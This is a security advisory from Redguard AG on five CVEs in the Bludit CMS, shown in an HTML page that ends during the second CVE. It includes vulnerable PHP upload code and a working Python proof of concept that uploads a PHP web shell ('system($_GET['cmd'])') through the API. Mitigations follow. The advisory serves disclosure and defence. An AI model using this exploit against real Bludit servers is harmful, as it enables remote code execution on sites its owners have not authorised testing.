<!DOCTYPE html> <html lang=de> <head> <meta charset=utf-8 /> <meta content="IE=edge,chrome=1" http-equiv=X-UA-Compatible /> <meta name=viewport content="width=device-width, initial-scale=1"/> <meta name=description content="In order to prepare for the OffSec Web Expert (OSWE) certification exam, I searched for open source web applications that I can analyze in a white box approach. I stumbled upon Bludit, an open source content management system for building websites and blogs. After a few hours of testing, I found five..."/> <meta name=keywords content="redguard, security, consulting, training, audit, testing, hacking, compliance"/> <meta name=title property="og:title" content="Redguard AG - Security Advisory: Multiple Vulnerabilities in the Open Source CMS Bludit"> <meta property="og:type" content=website> <meta name=image property="og:image" content="/images/blog/advisory-bludit-e6903a1c.jpeg"> <meta name=description property="og:description" content="In order to prepare for the OffSec Web Expert (OSWE) certification exam, I searched for open source web applications that I can analyze in a white box approach. I stumbled upon Bludit, an open source content management system for building websites and blogs. After a few hours of testing, I found five..."> <meta name=author content="Redguard AG"> <meta name="twitter:card" content=summary /> <meta name="twitter:creator" content="@redguard_ch"/> <meta name="twitter:site" content="@redguard_ch"/> <meta name="twitter:image" content="/images/blog/advisory-bludit-e6903a1c.jpeg"/> <meta name="twitter:description" content="In order to prepare for the OffSec Web Expert (OSWE) certification exam, I searched for open source web applications that I can analyze in a white box approach. I stumbled upon Bludit, an open source content management system for building websites and blogs. After a few hours of testing, I found five..."/> <title>Redguard AG - Security Advisory: Multiple Vulnerabilities in the Open Source CMS Bludit</title> <link rel="shortcut icon" href="/images/icons/svg-icons/redguard-rg-favicon-6cc9cdce.svg" sizes=any type="image/svg+xml"> <link href="/stylesheets/styles-f1c6b8cf.css" rel=stylesheet /> <!--[if !IE 7]><style>
      #wrap {
        display: table;
        height:100%
      }
      </style><![endif]--> <!--[if lt IE 9]><script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script> <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]--> <script src="https://www.google.com/recaptcha/api.js?render=6LfoaIcpAAAAAMcNZHkh-Y_BJn6_P35yLke8HQ5f"></script> <script src="/javascripts/all-06864d34.js"></script> <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-W5SVXQ2');</script> </head> <body class="blog blog_2024 blog_2024_06 blog_2024_06_20 blog_2024_06_20_security-advisory-bludit blog_2024_06_20_security-advisory-bludit_index"> <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W5SVXQ2" height=0 width=0 style="display:none;visibility:hidden"></iframe></noscript> <div id=outer-wrap> <div class=sticky-header> <div class="container-md gx-0 d-flex justify-content-end"> <div id=quickbar class=d-flex> <ul class="quickbar-nav incident"> <li><a href="/services/incident-response/"><span><img src="/images/alarm-bell-ring-6c2b19fd.svg" alt=""/> Cyberattacke?</span></a></li> </ul> <ul class="quickbar-nav d-flex"> <li><a href="#"><a href="/blog/2024/06/20/security-advisory-bludit/" is_root_language=true>DE</a></a></li> <li class=divider>&middot;</li> <li><a href="#"><a href="/blog/2024/06/20/security-advisory-bludit/">EN</a></a></li> <li class=divider>&middot;</li> <li><a href="#"><a href="/blog/2024/06/20/security-advisory-bludit/">FR</a></a></li> </ul> </div> </div> <nav class="container-md mx-auto px-0 px-md-3 mt-2 mt-md-2 mt-lg-0 navbar navbar-expand-md flex-column navbar-default" role=navigation> <div class="container-md gx-0"> <a class="navbar-brand ps-3 ps-md-0" href="/"> <img src="/images/logo-f241fae0.svg" class=company_logo alt="Redguard AG logo" onerror="this.src=&quot;/images/logo.jpg&quot;;this.onerror=null;"/> </a> <button class="navbar-toggler pe-3 pe-md-0" type=button data-bs-toggle=collapse data-bs-target="#navbarSupportedContent" aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation"> <div class=icon-bar></div> <div class=icon-bar></div> <div class=icon-bar></div> </button> <div class="collapse navbar-collapse" id=navbarSupportedContent> <div class=flex-grow-1></div> <ul class="nav navbar-nav"> <li class="nav-item dropdown has-megamenu"> <a href="#" class="nav-link dropdown-toggle" data-bs-toggle=dropdown aria-expanded=false>Services</a> <div class="dropdown-menu megamenu"> <div class="row g-0 g-lg-3 mt-0 mt-md-3 mt-lg-0"> <div class="col-lg-3 col-6"> <div class=col-megamenu> <h4 class="title fw-bold">Consulting &amp; Compliance</h4> <ul class=megamenu-list> <li><a href="/services/strategy-and-management">Strategie, Richtlinien, Vorgaben</a></li> <li><a href="/services/compliance-and-risk-management">Compliance &amp; Risk Management</a></li> <li><a href="/services/data-privacy">Datenschutz & Privacy</a></li> <li><a href="/services/security-specialists">Security Spezialisten</a></li> </ul> </div> </div> <div class="col-lg-3 col-6"> <div class=col-megamenu> <h4 class="title fw-bold">Testing &amp; Assessment</h4> <ul class=megamenu-list> <li><a href="/services/penetration-testing">Penetration Testing</a></li> <li><a href="/services/attack-simulation">Simulation</a></li> <li><a href="/services/phishing">Phishing &amp; Social Engineering</a></li> <li><a href="/services/cyber-security-assessment">Cyber Security Assessment</a></li> <li><a href="/services/cloud-security">Cloud Security</a></li> </ul> </div> </div> <div class="col-lg-3 col-6"> <div class=col-megamenu> <h4 class="title fw-bold">Resilience &amp; Awareness</h4> <ul class=megamenu-list> <li><a href="/services/incident-response">Incident Response</a></li> <li><a href="/services/darknet-monitoring">Darknet Monitoring</a></li> <li><a href="/services/security-awareness">Security Awareness</a></li> <li><a href="/services/business-continuity-management">Business Continuity Management (BCM)</a></li> <li><a href="/services/trainings">Trainings</a></li> </ul> </div> </div> <div class="col-lg-3 col-6"> <div class=col-megamenu> <h4 class="title fw-bold">Architecture &amp; Engineering</h4> <ul class=megamenu-list> <li><a href="/services/security-architecture-review">Architecture Review</a></li> <li><a href="/services/security-architecture-concepts-studies">Architecture Concepts & Studies</a></li> <li><a href="/services/security-project-management">Security Project Management</a></li> <li><a href="/services/devsecops">DevSecOps</a></li> <li><a href="/services/infrastructure-product-security">Infrastructure & Product Security</a></li> <li><a href="/services/secure-coding">Secure Coding</a></li> </ul> </div> </div> </div> </div> </li> <li class="nav-item dropdown"> <a href="#" class="nav-link dropdown-toggle" data-bs-toggle=dropdown aria-expanded=false>Ãber uns</a> <ul class="dropdown-menu normalmenu"> <li class=""><a href="/company/" class=dropdown-item>Firma</a></li> <li class=""><a href="/company/team/" class=dropdown-item>Unser Team</a></li> <li class=""><a href="/company/references/" class=dropdown-item>Referenzen</a></li> </ul> </li> <li class=nav-item><a href="https://jobs.redguard.ch/" class=nav-link target=_blank>Jobs</a></li> <li class=nav-item><a href="/blog/" class=nav-link>Blog</a></li> <li class=nav-item><a href="/contact/" class=nav-link>Kontakt</a></li> </ul> </div> </div> </nav> </div> <div id=yield-wrap class=bullet-points> <style>
  .highlight table td { padding: 5px; }
.highlight table pre { margin: 0; }
.highlight .cm {
  color: #999988;
  font-style: italic;
}
.highlight .cp {
  color: #999999;
  font-weight: bold;
}
.highlight .c1 {
  color: #999988;
  font-style: italic;
}
.highlight .cs {
  color: #999999;
  font-weight: bold;
  font-style: italic;
}
.highlight .c, .highlight .ch, .highlight .cd, .highlight .cpf {
  color: #999988;
  font-style: italic;
}
.highlight .err {
  color: #a61717;
  background-color: #e3d2d2;
}
.highlight .gd {
  color: #000000;
  background-color: #ffdddd;
}
.highlight .ge {
  color: #000000;
  font-style: italic;
}
.highlight .gr {
  color: #aa0000;
}
.highlight .gh {
  color: #999999;
}
.highlight .gi {
  color: #000000;
  background-color: #ddffdd;
}
.highlight .go {
  color: #888888;
}
.highlight .gp {
  color: #555555;
}
.highlight .gs {
  font-weight: bold;
}
.highlight .gu {
  color: #aaaaaa;
}
.highlight .gt {
  color: #aa0000;
}
.highlight .kc {
  color: #000000;
  font-weight: bold;
}
.highlight .kd {
  color: #000000;
  font-weight: bold;
}
.highlight .kn {
  color: #000000;
  font-weight: bold;
}
.highlight .kp {
  color: #000000;
  font-weight: bold;
}
.highlight .kr {
  color: #000000;
  font-weight: bold;
}
.highlight .kt {
  color: #445588;
  font-weight: bold;
}
.highlight .k, .highlight .kv {
  color: #000000;
  font-weight: bold;
}
.highlight .mf {
  color: #009999;
}
.highlight .mh {
  color: #009999;
}
.highlight .il {
  color: #009999;
}
.highlight .mi {
  color: #009999;
}
.highlight .mo {
  color: #009999;
}
.highlight .m, .highlight .mb, .highlight .mx {
  color: #009999;
}
.highlight .sa {
  color: #000000;
  font-weight: bold;
}
.highlight .sb {
  color: #d14;
}
.highlight .sc {
  color: #d14;
}
.highlight .sd {
  color: #d14;
}
.highlight .s2 {
  color: #d14;
}
.highlight .se {
  color: #d14;
}
.highlight .sh {
  color: #d14;
}
.highlight .si {
  color: #d14;
}
.highlight .sx {
  color: #d14;
}
.highlight .sr {
  color: #009926;
}
.highlight .s1 {
  color: #d14;
}
.highlight .ss {
  color: #990073;
}
.highlight .s, .highlight .dl {
  color: #d14;
}
.highlight .na {
  color: #008080;
}
.highlight .bp {
  color: #999999;
}
.highlight .nb {
  color: #0086B3;
}
.highlight .nc {
  color: #445588;
  font-weight: bold;
}
.highlight .no {
  color: #008080;
}
.highlight .nd {
  color: #3c5d5d;
  font-weight: bold;
}
.highlight .ni {
  color: #800080;
}
.highlight .ne {
  color: #990000;
  font-weight: bold;
}
.highlight .nf, .highlight .fm {
  color: #990000;
  font-weight: bold;
}
.highlight .nl {
  color: #990000;
  font-weight: bold;
}
.highlight .nn {
  color: #555555;
}
.highlight .nt {
  color: #000080;
}
.highlight .vc {
  color: #008080;
}
.highlight .vg {
  color: #008080;
}
.highlight .vi {
  color: #008080;
}
.highlight .nv, .highlight .vm {
  color: #008080;
}
.highlight .ow {
  color: #000000;
  font-weight: bold;
}
.highlight .o {
  color: #000000;
  font-weight: bold;
}
.highlight .w {
  color: #bbbbbb;
}
.highlight {
  background-color: #f8f8f8;
}

  div.highlight, div.highlight > pre {
    background-color: transparent;
    border-radius: 0px;
    border: none;
  }
</style> <div class=page-header> <div class=container> <h1>Blog</h1> </div> </div> <div class="container bullet-points blog-post"> <div class=row> <div class="col-md-12 lead"> <h1 style="margin-top: 0px;">Security Advisory: Multiple Vulnerabilities in the Open Source CMS Bludit</h1> <p> Jun 20, 2024 von Andreas Pfefferle </p> </div> </div> <div class=row> <div class="col-md-12 lead"> <div class=pull-left style="max-width: 30%; display:inline-block;"><img src="/images/blog/advisory-bludit-e6903a1c.jpeg" style="max-width:100%; max-height:220px; margin-top: 6px; padding-right: 15px;" alt=""/></div> <div style="text-align:justify;" id=blog-post><p>In order to prepare for the <a href="https://www.offsec.com/courses/web-300/">OffSec Web Expert (OSWE) certification exam</a>, I searched for open source web applications that I can analyze in a white box approach. I stumbled upon <a href="https://github.com/bludit/bludit">Bludit</a>, an open source content management system for building websites and blogs. After a few hours of testing, I found five security vulnerabilities, including two remote code execution flaws. This advisory briefly explains the vulnerabilities and proposes possible fixes and mitigations.</p> <p>It should be noted that at the time of publication of this advisory, the security vulnerabilities had not yet been addressed by the Bludit development team. Redguard initiated a <a href="https://en.wikipedia.org/wiki/Coordinated_vulnerability_disclosure">Coordinated Vulnerability Disclosure</a> in January 2024, which the maintainers of Bludit have not responded to.</p> <p><strong>The following security vulnerabilities have been identified in Bludit:</strong></p> <ul> <li><a href="#cve-2024-24550-bludit">CVE-2024-24550: Bludit - Remote Code Exection (RCE) through File API</a></li> <li><a href="#cve-2024-24551-bludit">CVE-2024-24551: Bludit - Remote Code Exection (RCE) through Image API</a></li> <li><a href="#cve-2024-24552-bludit">CVE-2024-24552: Bludit is Vulnerable to Session Fixation</a></li> <li><a href="#cve-2024-24553-bludit">CVE-2024-24553: Bludit uses SHA1 as Password Hashing Algorithm</a></li> <li><a href="#cve-2024-24554-bludit">CVE-2024-24554: Bludit - Insecure Token Generation</a></li> </ul> <h2 id=cve-2024-24550-bludit>CVE-2024-24550: Bludit - Remote Code Execution (RCE) through File API</h2> <p>A security vulnerability in Bludit allows attackers with knowledge of the API token to upload arbitrary files through the File API which leads to arbitrary code execution on the server. This vulnerability arises from improper handling of file uploads, enabling malicious actors to upload and execute PHP files.</p> <p><a href="https://www.first.org/cvss/v4.0/specification-document">CVSS v4.0</a> Score: 8.9 (HIGH)</p> <h3>Details</h3> <p>Attackers with knowledge of the API token can exploit the Bludit Files API, which includes a seemingly undocumented file upload feature, to upload arbitrary files. The respective file upload API request seems to be undocumented as it is not mentioned in the <a href="https://docs.bludit.com/en/api/introduction">official Bludit API documentation</a> (as of 2024-06-15). </p> <p>The file upload API does not perform any form of file type checking (neither file extension nor MIME type are checked), which allows any user with knowledge of the API token to upload, for instance, PHP files. The uploaded files are stored in a file directory under the web root, making them accessible to any site visitor, including unauthenticated users. This means that if authenticated attackers were able to upload a PHP web shell to the server, even unauthenticated users could run commands on the server by using the web shell.</p> <p>The affected code was committed to the <a href="https://github.com/bludit/bludit/commit/964d99bd80b6d592399787b45626b36d9d8ac2ba#diff-51e713ebe4d6c558717bfbe91e829bc8e08f2fcfb9037fd196901dccbea30f51R730">Git repository about 4 years ago</a>. </p> <div class=highlight><pre class="highlight php"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class=rouge-code><pre><span class="k">private</span> <span class="k">function</span> <span class="n">uploadFile</span><span class="p">(</span><span class="nv">$pageKey</span><span class="p">)</span>
<span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">array</span><span class="p">(</span>
                        <span class="s1">'status'</span><span class="o">=&gt;</span><span class="s1">'1'</span><span class="p">,</span>
                        <span class="s1">'message'</span><span class="o">=&gt;</span><span class="s1">'File not sent.'</span>
                <span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">array</span><span class="p">(</span>
                        <span class="s1">'status'</span><span class="o">=&gt;</span><span class="s1">'1'</span><span class="p">,</span>
                        <span class="s1">'message'</span><span class="o">=&gt;</span><span class="s1">'Error uploading the file.'</span>
                <span class="p">);</span>
        <span class="p">}</span>

        <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">];</span>
        <span class="nv">$absoluteURL</span> <span class="o">=</span> <span class="no">DOMAIN_UPLOADS_PAGES</span><span class="mf">.</span><span class="nv">$pageKey</span><span class="mf">.</span><span class="no">DS</span><span class="mf">.</span><span class="nv">$filename</span><span class="p">;</span>
        <span class="nv">$absolutePath</span> <span class="o">=</span> <span class="no">PATH_UPLOADS_PAGES</span><span class="mf">.</span><span class="nv">$pageKey</span><span class="mf">.</span><span class="no">DS</span><span class="mf">.</span><span class="nv">$filename</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nc">Filesystem</span><span class="o">::</span><span class="nf">mv</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="nv">$absolutePath</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="k">array</span><span class="p">(</span>
                        <span class="s1">'status'</span><span class="o">=&gt;</span><span class="s1">'0'</span><span class="p">,</span>
                        <span class="s1">'message'</span><span class="o">=&gt;</span><span class="s1">'File uploaded.'</span><span class="p">,</span>
                        <span class="s1">'filename'</span><span class="o">=&gt;</span><span class="nv">$filename</span><span class="p">,</span>
                        <span class="s1">'absolutePath'</span><span class="o">=&gt;</span><span class="nv">$absolutePath</span><span class="p">,</span>
                        <span class="s1">'absoluteURL'</span><span class="o">=&gt;</span><span class="nv">$absoluteURL</span>
                <span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'status'</span><span class="o">=&gt;</span><span class="s1">'1'</span><span class="p">,</span>
                <span class="s1">'message'</span><span class="o">=&gt;</span><span class="s1">'Error moving the file to the final path.'</span>
        <span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div> <p>As can be seen in the code snippet above, the uploaded file is written to the web root without any prior sanitization.</p> <h3>Preconditions</h3> <p>To exploit this vulnerability, several preconditions must be met. First, the Bludit administrator must have enabled the API, as it is disabled by default. Additionally, the attacker needs to possess knowledge of the API token. However, it is important to note that authentication is not necessary to access the file upload directory.</p> <h3>Proof-of-Concept</h3> <div class=highlight><pre class="highlight python"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
</pre></td><td class=rouge-code><pre><span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">def</span> <span class="nf">get_page_uuid</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/api/pages?token=</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Connection'</span><span class="p">:</span> <span class="s">'close'</span><span class="p">})</span>
    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>

        <span class="k">if</span> <span class="s">'data'</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="s">'data'</span><span class="p">]:</span>
            <span class="c1"># Take the first element from the 'data' array
</span>            <span class="n">first_element</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s">'data'</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>

            <span class="k">if</span> <span class="s">'uuid'</span> <span class="ow">in</span> <span class="n">first_element</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">first_element</span><span class="p">[</span><span class="s">'uuid'</span><span class="p">]</span>

    <span class="k">return</span> <span class="bp">None</span>


<span class="k">def</span> <span class="nf">upload_file</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">api_token</span><span class="p">,</span> <span class="n">file_name</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="n">uuid</span><span class="p">):</span>
    <span class="n">boundary</span> <span class="o">=</span> <span class="s">"BOUNDARY_STRING"</span>

    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"Content-Type"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"multipart/form-data; boundary=</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
        <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span>
    <span class="p">}</span>


    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">
Content-Disposition: form-data; name="token"

</span><span class="si">{</span><span class="n">api_token</span><span class="si">}</span><span class="s">
--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">
Content-Disposition: form-data; name="file"; filename="</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s">"
Content-Type: text/plain

</span><span class="si">{</span><span class="n">file_content</span><span class="si">}</span><span class="s">
--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">--"""</span>


    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/api/files/</span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="s">"</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
        <span class="n">url</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
        <span class="n">data</span><span class="o">=</span><span class="n">data</span>
    <span class="p">)</span>
    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>

        <span class="k">if</span> <span class="s">'message'</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="s">'message'</span><span class="p">]</span> <span class="o">==</span> <span class="s">"File uploaded."</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/bl-content/uploads/pages/</span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s">?cmd=id"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"Error: Unexpected response from the server."</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Error: Unexpected response from the server."</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">"Generate and send a POST request."</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--target"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Target URL (e.g., http://localhost:8000)"</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--api-token"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"API token"</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="n">uuid</span> <span class="o">=</span> <span class="n">get_page_uuid</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">api_token</span><span class="p">)</span>

    <span class="n">file_name</span> <span class="o">=</span> <span class="s">"shell.php"</span>
    <span class="n">file_content</span> <span class="o">=</span> <span class="s">"&lt;?php system($_GET['cmd']); ?&gt;"</span>

    <span class="n">upload_file</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">api_token</span><span class="p">,</span> <span class="n">file_name</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="n">uuid</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div> <h3>Affected Versions</h3> <p>All Bludit versions since 3.14.0 (released on 2022-09-05), including the most recent version 3.15.0 (as of 2024-06-15) are affected.</p> <h3>Suggested Mitigations and Countermeasures</h3> <ol> <li>Remove file upload API: As the API POST request for uploading files is not documented, it can be assumed that it is a feature not actually needed by Bludit users. This is substantiated by the fact that users also cannot upload arbitrary files with the web application (AJAX).</li> <li>Use an allowlist: If the first suggestion is not feasible as it is an actively used feature of Bludit users, it is advised to restrict the possible upload file formats with an allowlist. Before storing the uploaded files in the intended directory, their file extension and mime type should be checked.</li> <li>Restrict upload storage: Users should only be allowed to store a certain amount of data on the file share (e.g. 10MB). </li> <li>If uploaded files should not be downloadable by everyone: Ensure that the temporary file directory is relocated outside of the web root to prevent unauthorized access.</li> <li>If uploaded files should be downloadable: Disable PHP in upload folder, e.g. with the following configuration in nginx:</li> </ol> <div class=highlight><pre class="highlight plaintext"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class=rouge-code><pre>location /upload_folder {
    # Disable PHP execution
    location ~ \.php$ {
        deny all;
    }

    # Allow other file types
    location /upload_folder/ {
        # Additional configurations for other file types if necessary
    }
}
</pre></td></tr></tbody></table></code></pre></div> <h2 id=cve-2024-24551-bludit>CVE-2024-24551: Bludit - Remote Code Execution (RCE) through Image API</h2> <p>A security vulnerability in Bludit allows authenticated attackers to execute arbitrary code through the Image API. This vulnerability arises from improper handling of file uploads, enabling malicious actors to upload and execute PHP files.</p> <p><a href="https://www.first.org/cvss/v4.0/specification-document">CVSS v4.0</a> Score: 8.9 (HIGH)</p> <h3>Details</h3> <p>Authenticated attackers can exploit the Bludit Image API, which includes an image upload feature, to upload arbitrary files. While the API performs some upload checks (e.g., validating file extensions against a predefined set of common image file types), uploaded files are stored in a temporary directory within the web root. In cases where the file extension is not allowed, the files are not deleted from the temporary file directory, making them accessible to any site visitor, including unauthenticated users. This means that if authenticated attackers were able to upload a PHP web shell to the server, even unauthenticated users could run commands on the server by using the web shell.</p> <p>The affected code was committed to the <a href="https://github.com/bludit/bludit/commit/2f63e920b07342ed787bf7172a88628e1a05abf0#diff-51e713ebe4d6c558717bfbe91e829bc8e08f2fcfb9037fd196901dccbea30f51R426">Git repository about 5 years ago</a>. Our comments in the code snippet below explain how the vulnerability arises.</p> <div class=highlight><pre class="highlight php"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class=rouge-code><pre>        <span class="k">private</span> <span class="k">function</span> <span class="n">uploadImage</span><span class="p">(</span><span class="nv">$inputs</span><span class="p">)</span>
        <span class="p">{</span>
<span class="p">[</span><span class="o">---</span><span class="no">SNIP</span><span class="o">---</span><span class="p">]</span>
                <span class="c1">// Move from PHP tmp file to Bludit tmp directory</span>
                <span class="nc">Filesystem</span><span class="o">::</span><span class="nf">mv</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'image'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">],</span> <span class="no">PATH_TMP</span><span class="mf">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'image'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]);</span>

                <span class="c1">// transformImage function checks if file extesion is allowed. If it is allowed, the file is moved (not just copied) to the intended image directory</span>
                <span class="nv">$image</span> <span class="o">=</span> <span class="nf">transformImage</span><span class="p">(</span><span class="no">PATH_TMP</span><span class="mf">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'image'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">],</span> <span class="nv">$imageDirectory</span><span class="p">,</span> <span class="nv">$thumbnailDirectory</span><span class="p">);</span>
              <span class="p">[</span><span class="o">---</span><span class="no">SNIP</span><span class="o">---</span><span class="p">]</span>

<span class="c1">// The transformImage function is defined in bl-kernel/functions.php</span>
<span class="k">function</span> <span class="n">transformImage</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$imageDir</span><span class="p">,</span> <span class="nv">$thumbnailDir</span> <span class="o">=</span> <span class="kc">false</span><span class="p">)</span>
<span class="p">{</span>
<span class="p">[</span><span class="o">---</span><span class="no">SNIP</span><span class="o">---</span><span class="p">]</span>
<span class="c1">// If the file extension is not allowed, tranformImage simply returns "false" without deleting the file from the temporary directory</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$fileExtension</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'ALLOWED_IMG_EXTENSION'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
